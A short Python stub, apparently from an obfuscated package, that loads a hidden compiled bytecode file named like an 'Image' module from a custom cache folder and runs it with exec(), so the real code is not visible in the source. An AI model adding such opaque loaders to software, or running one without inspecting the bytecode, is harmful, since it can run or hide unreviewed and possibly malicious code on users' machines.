
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'Image_8824f9ff6d824610bb5e0530d81452e3.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
